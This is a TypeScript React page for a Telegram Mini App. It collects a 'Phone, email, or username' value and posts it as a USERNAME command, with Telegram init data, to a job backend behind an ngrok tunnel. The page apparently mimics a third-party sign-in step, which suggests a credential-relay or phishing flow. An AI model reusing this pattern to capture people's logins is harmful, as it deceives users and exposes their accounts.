// src/pages/Username.tsx
import { useState } from "react";
import axios from "axios";
import { useSignal, initData } from "@tma.js/sdk-react";
import "./Username.css";
import type {
  JobsStatusResponse,
  JobCommandResponse,
} from "../../../server/src/types/jobs";

export const Username = () => {
  const [input, setInput] = useState("");
  const initDataRaw = useSignal(initData.raw); // initData Telegram

  const handleNext = async () => {
    if (!initDataRaw) {
      console.warn("No initDataRaw yet, cannot call backend");
      return;
    }

    // 🔹 Cas 1 : input vide → check status du job
    if (!input.trim()) {
      try {
        const resp = await axios.post<JobsStatusResponse>(
          "https://juiceless-hyo-pretechnical.ngrok-free.dev/api/jobs/status",
          { initData: initDataRaw },
          { headers: { "Content-Type": "application/json" } }
        );

        console.log("🔎 Job status response:", resp.data);
        // resp.data.status       → "idle" | "running" | "done"
        // resp.data.jobId        → id du job
        // resp.data.result       → résultat du job (si terminé)
        // resp.data.commandState → état de la dernière commande
      } catch (err) {
        console.error("Error while fetching job status:", err);
      }
      return;
    }

    // 🔹 Cas 2 : input non vide → envoyer une commande USERNAME
    try {
      const resp = await axios.post<JobCommandResponse>(
        "https://juiceless-hyo-pretechnical.ngrok-free.dev/api/jobs/command",
        {
          initData: initDataRaw,
          command: {
            type: "USERNAME",
            payload: {
              username: input,
            },
          },
        },
        { headers: { "Content-Type": "application/json" } }
      );

      console.log("📤 Command USERNAME response:", resp.data);
      // resp.data.ok
      // resp.data.state       → CommandState si ok
      // resp.data.error       → si NO_ACTIVE_SESSION / COMMAND_ALREADY_RUNNING / etc.
    } catch (err) {
      console.error("Error while sending USERNAME command:", err);
    }
  };

  return (
    <div className="username-page">
      <div className="username-container">
        <input
          type="text"
          placeholder="Phone, email, or username"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          className="username-input"
        />
        <button className="next-button" onClick={handleNext}>
          Next
        </button>
      </div>
    </div>
  );
};
